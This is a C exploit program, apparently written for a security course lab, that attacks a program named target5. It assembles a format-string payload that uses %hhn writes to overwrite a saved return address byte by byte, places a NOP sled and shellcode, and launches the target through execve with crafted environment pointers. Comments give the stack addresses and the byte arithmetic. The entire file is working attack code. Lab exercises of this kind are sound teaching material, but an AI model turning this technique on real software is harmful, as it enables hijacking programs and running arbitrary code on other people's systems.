#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target5"
//&rip = 0x3021fea8
//&rbp = 0x3021fea0
//&buf = 0x3021faa0
//&formatString = 0x3021f9a0  &formatString[60] = 0x3021f9dc
//&arg = 0x3021f998
#define BUFSIZE 257 //TBD
#define SHELLSIZE 45 // strlen(shellcode)=45

int main(void)
{
  char *	args[3];
	char *	env[16];

  //making overflow buffer
  char buff[BUFSIZE];

  char target_ra[] =  "\xa8\xfe\x21\x30\x00\x00\x00\x00";
  char target_ra2[] = "\xa9\xfe\x21\x30\x00\x00\x00\x00";
  char target_ra3[] = "\xaa\xfe\x21\x30\x00\x00\x00\x00";
  char target_ra4[] = "\xab\xfe\x21\x30\x00\x00\x00\x00";
  char dummy[] = "\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa";

  //fill the buff with NOP
  for(int i=0;i<BUFSIZE;i++)
  {
    buff[i] = '\x90'; //fill with NOP=0x90
  }

  //fill ra
  for (int i=0; i<8; i++)
  {
    buff[i] = target_ra[i];
  }

  //fill dummy
  for (int i=0; i<8; i++)
  {
    buff[i+8] = dummy[i];
  }

  //fill ra2
  for (int i=0; i<8; i++)
  {
    buff[i+8+8] = target_ra2[i];
  }

  //fill dummy
  for (int i=0; i<8; i++)
  {
    buff[i+8+8+8] = dummy[i];
  }
  
  //fill ra3
  for (int i=0; i<8; i++)
  {
    buff[i+8+8+8+8] = target_ra3[i];
  }

  //fill dummy
  for (int i=0; i<8; i++)
  {
    buff[i+8+8+8+8+8] = dummy[i];
  }

  //fill ra4
  for (int i=0; i<8; i++)
  {
    buff[i+8+8+8+8+8+8] = target_ra4[i];
  }
  

  //need return address to be 120d from buff where shellcode starts->
  //0x3021f9a0 + 0d110 -> 3021FA18
  //byte 0: 0x18 = 24
  //byte 1: 0xFA-0x18=226
  //byte 2: d(0x21)+d256-0xFA = 39
  //byte 3: 0x30-0x21 = 15
  char formatStr[] = "%64x%64x%64x%64x%24x%hhn%226x%hhn%39x%hhn%15x%hhn";

  //put format string from buff[60]
  for (int i =0; i< strlen(formatStr); i++)
  {
    buff[i+60] = formatStr[i];
  }

  //fill shellcode
  for (int i =0; i<SHELLSIZE; i++)
  {
    buff[i+120] = shellcode[i];
  }

  //put null terminator at the end of buffer
  buff[BUFSIZE-1] = '\0';

  args[0] = TARGET; 
  args[1] = buff; 
  args[2] = NULL;

  env[0] = &buff[5];
  env[1] = &buff[6];
  env[2] = &buff[7];
  env[3] = &buff[8];

  env[4] = &buff[21];
  env[5] = &buff[22];
  env[6] = &buff[23];
  env[7] = &buff[24];

  env[8] = &buff[37];
  env[9] = &buff[38];
  env[10] = &buff[39];
  env[11] = &buff[40];

  env[12] = &buff[53];
  env[13] = &buff[54];
  env[14] = &buff[55];
  env[15] = &buff[56];

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}